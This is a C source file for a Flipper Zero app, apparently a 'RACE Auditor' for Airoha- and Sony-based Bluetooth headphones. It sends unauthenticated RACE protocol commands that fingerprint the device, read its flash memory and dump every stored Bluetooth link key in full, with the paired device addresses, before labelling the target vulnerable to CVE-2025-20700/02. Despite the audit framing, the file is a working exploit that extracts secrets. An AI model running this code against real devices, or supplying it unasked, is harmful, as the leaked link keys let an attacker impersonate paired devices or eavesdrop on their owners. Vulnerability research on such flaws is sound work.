#include "../race_auditor_app_i.h"

static void send_race_cmd(RaceAuditorApp* app, uint16_t cmd_id, const uint8_t* payload, uint16_t len) {
    uint8_t buf[64];
    uint16_t pkt_len = race_build_cmd(buf, cmd_id, payload, len);
    app->has_response = false;
    ble_gatt_client_write(app->connection_handle, app->tx_handle, buf, pkt_len);
}

static void append_log(RaceAuditorApp* app, const char* text) {
    furi_string_cat_str(app->audit_log, text);
    text_box_set_text(app->text_box, furi_string_get_cstr(app->audit_log));
}

static void append_hex_line(RaceAuditorApp* app, const uint8_t* data, uint16_t len) {
    char hex[128];
    size_t pos = 0;
    uint16_t show = len > 16 ? 16 : len;
    for(uint16_t i = 0; i < show; i++) {
        pos += snprintf(hex + pos, sizeof(hex) - pos, "%02X ", data[i]);
    }
    if(len > 16) {
        snprintf(hex + pos, sizeof(hex) - pos, "...");
    }
    furi_string_cat_str(app->audit_log, hex);
    furi_string_cat_str(app->audit_log, "\n");
    text_box_set_text(app->text_box, furi_string_get_cstr(app->audit_log));
}

static void advance_phase(RaceAuditorApp* app) {
    switch(app->audit_phase) {
    case AuditPhaseSubscribe:
        app->audit_phase = AuditPhaseSdkVersion;
        append_log(app, "[*] SDK Version...\n");
        send_race_cmd(app, RACE_CMD_SDK_VERSION, NULL, 0);
        break;
    case AuditPhaseSdkVersion:
        app->audit_phase = AuditPhaseBuildVersion;
        append_log(app, "[*] Build Version...\n");
        send_race_cmd(app, RACE_CMD_BUILD_VERSION, NULL, 0);
        break;
    case AuditPhaseBuildVersion:
        app->audit_phase = AuditPhaseBdAddress;
        append_log(app, "[*] BD Address...\n");
        send_race_cmd(app, RACE_CMD_GET_BD_ADDR, NULL, 0);
        break;
    case AuditPhaseBdAddress:
        app->audit_phase = AuditPhaseFlashCheck;
        append_log(app, "[*] Flash read test...\n");
        // Read first page at flash base — proves arbitrary flash access
        uint8_t flash_payload[6] = {
            0x00, // storage_type
            0x01, // size >> 8 (1 page = 0x100 bytes)
            (RACE_FLASH_BASE) & 0xFF,
            (RACE_FLASH_BASE >> 8) & 0xFF,
            (RACE_FLASH_BASE >> 16) & 0xFF,
            (RACE_FLASH_BASE >> 24) & 0xFF,
        };
        send_race_cmd(app, RACE_CMD_FLASH_READ, flash_payload, sizeof(flash_payload));
        break;
    case AuditPhaseFlashCheck:
        app->audit_phase = AuditPhaseLinkKeys;
        append_log(app, "[*] Link Keys...\n");
        send_race_cmd(app, RACE_CMD_GET_LINK_KEYS, NULL, 0);
        break;
    case AuditPhaseLinkKeys:
        app->audit_phase = AuditPhaseDone;
        append_log(app, "\n--- Audit Complete ---\n");
        if(app->vulnerable) {
            append_log(app, "VULNERABLE: RACE exposed\nwithout authentication\n(CVE-2025-20700/02)\n");
        } else {
            append_log(app, "Device responded but\nflash read failed.\nMay be patched.\n");
        }
        notification_message(app->notifications, &sequence_success);
        break;
    case AuditPhaseDone:
        break;
    }
}

static void handle_response(RaceAuditorApp* app) {
    furi_mutex_acquire(app->mutex, FuriWaitForever);
    uint8_t resp[RACE_MAX_RESPONSE];
    uint16_t resp_len = app->resp_len;
    memcpy(resp, app->resp_buf, resp_len);
    app->has_response = false;
    furi_mutex_release(app->mutex);

    if(resp_len < RACE_HEADER_SIZE) {
        append_log(app, "  [!] Short response\n");
        advance_phase(app);
        return;
    }

    uint16_t cmd_id = race_parse_cmd_id(resp, resp_len);
    uint16_t payload_len;
    const uint8_t* payload = race_parse_payload(resp, resp_len, &payload_len);

    switch(app->audit_phase) {
    case AuditPhaseSdkVersion:
        if(cmd_id == RACE_CMD_SDK_VERSION && payload_len > 1) {
            // Response: [return_code] [string...]
            char version[128];
            uint16_t str_len = payload_len - 1;
            if(str_len >= sizeof(version)) str_len = sizeof(version) - 1;
            memcpy(version, &payload[1], str_len);
            version[str_len] = '\0';
            furi_string_cat_printf(app->audit_log, "  SDK: %s\n", version);
            text_box_set_text(app->text_box, furi_string_get_cstr(app->audit_log));
        } else {
            append_log(app, "  [!] No SDK response\n");
        }
        break;

    case AuditPhaseBuildVersion:
        if(cmd_id == RACE_CMD_BUILD_VERSION && payload_len > 1) {
            char version[128];
            uint16_t str_len = payload_len - 1;
            if(str_len >= sizeof(version)) str_len = sizeof(version) - 1;
            memcpy(version, &payload[1], str_len);
            version[str_len] = '\0';
            furi_string_cat_printf(app->audit_log, "  Build: %s\n", version);
            text_box_set_text(app->text_box, furi_string_get_cstr(app->audit_log));
        } else {
            append_log(app, "  [!] No build response\n");
        }
        break;

    case AuditPhaseBdAddress:
        if(cmd_id == RACE_CMD_GET_BD_ADDR && payload_len >= 8) {
            // [return_code][agent_or_partner][bd_addr(6)]
            furi_string_cat_printf(app->audit_log,
                "  BD: %02X:%02X:%02X:%02X:%02X:%02X\n",
                payload[7], payload[6], payload[5],
                payload[4], payload[3], payload[2]);
            text_box_set_text(app->text_box, furi_string_get_cstr(app->audit_log));
        } else {
            append_log(app, "  [!] No BD addr\n");
        }
        break;

    case AuditPhaseFlashCheck:
        if(cmd_id == RACE_CMD_FLASH_READ && payload_len > 8) {
            uint8_t ret_code = payload[0];
            if(ret_code == 0) {
                app->vulnerable = true;
                append_log(app, "  FLASH READ OK!\n  First 16 bytes:\n  ");
                // Flash data starts at payload offset 8
                append_hex_line(app, &payload[8], payload_len - 8);
            } else {
                furi_string_cat_printf(app->audit_log, "  Flash read returned %d\n", ret_code);
                text_box_set_text(app->text_box, furi_string_get_cstr(app->audit_log));
            }
        } else {
            append_log(app, "  [!] Flash read failed\n");
        }
        break;

    case AuditPhaseLinkKeys:
        if(cmd_id == RACE_CMD_GET_LINK_KEYS && payload_len >= 3) {
            uint8_t num_keys = payload[1];
            furi_string_cat_printf(app->audit_log, "  Found %d link key(s)\n", num_keys);
            // Each key record: [bd_addr(6)][link_key(16)] = 22 bytes, starting at payload[3]
            uint16_t offset = 3;
            for(uint8_t i = 0; i < num_keys && offset + 22 <= payload_len; i++) {
                furi_string_cat_printf(app->audit_log,
                    "  [%d] %02X:%02X:%02X:%02X:%02X:%02X\n  Key: ",
                    i,
                    payload[offset + 5], payload[offset + 4], payload[offset + 3],
                    payload[offset + 2], payload[offset + 1], payload[offset + 0]);
                for(uint8_t j = 0; j < 16; j++) {
                    furi_string_cat_printf(app->audit_log, "%02X", payload[offset + 6 + j]);
                }
                furi_string_cat_str(app->audit_log, "\n");
                offset += 22;
            }
            text_box_set_text(app->text_box, furi_string_get_cstr(app->audit_log));
        } else {
            append_log(app, "  [!] No link keys\n");
        }
        break;

    default:
        break;
    }

    advance_phase(app);
}

void race_scene_audit_on_enter(void* context) {
    RaceAuditorApp* app = context;

    furi_string_reset(app->audit_log);
    app->audit_phase = AuditPhaseSubscribe;
    app->vulnerable = false;
    app->has_response = false;

    const char* variant_name = app->variant == RaceVariantSony ? "Sony" : "Airoha";
    furi_string_cat_printf(app->audit_log,
        "=== RACE Audit ===\nDevice: %s\nVariant: %s\n\n",
        app->current_device.has_name ? app->current_device.name : "Unknown",
        variant_name);

    text_box_reset(app->text_box);
    text_box_set_text(app->text_box, furi_string_get_cstr(app->audit_log));
    text_box_set_font(app->text_box, TextBoxFontText);
    view_dispatcher_switch_to_view(app->view_dispatcher, RaceViewTextBox);

    // Subscribe to RX notifications, then start commands
    append_log(app, "[*] Subscribing to RX...\n");
    ble_gatt_client_subscribe_notifications(app->connection_handle, app->rx_handle, true);

    // Start first command after a brief delay for subscription to settle
    furi_timer_start(app->timer, 500);
}

bool race_scene_audit_on_event(void* context, SceneManagerEvent event) {
    RaceAuditorApp* app = context;
    if(event.type != SceneManagerEventTypeCustom) return false;

    if(event.event == RaceCustomEventTick) {
        if(app->audit_phase == AuditPhaseSubscribe) {
            furi_timer_stop(app->timer);
            advance_phase(app);
        }
        return true;
    }

    if(event.event == RaceCustomEventWriteComplete) {
        // Command sent, wait for notification response
        // Start timeout timer
        furi_timer_start(app->timer, 3000);
        return true;
    }

    if(event.event == RaceCustomEventNotification) {
        furi_timer_stop(app->timer);
        handle_response(app);
        return true;
    }

    if(event.event == RaceCustomEventGattError) {
        append_log(app, "[!] GATT error\n");
        advance_phase(app);
        return true;
    }

    return false;
}

void race_scene_audit_on_exit(void* context) {
    RaceAuditorApp* app = context;
    furi_timer_stop(app->timer);

    // Unsubscribe
    if(app->connected && app->rx_handle) {
        ble_gatt_client_subscribe_notifications(app->connection_handle, app->rx_handle, false);
    }

    // Disconnect
    if(app->connected) {
        gap_disconnect(app->connection_handle);
        app->connected = false;
    }

    text_box_reset(app->text_box);
}
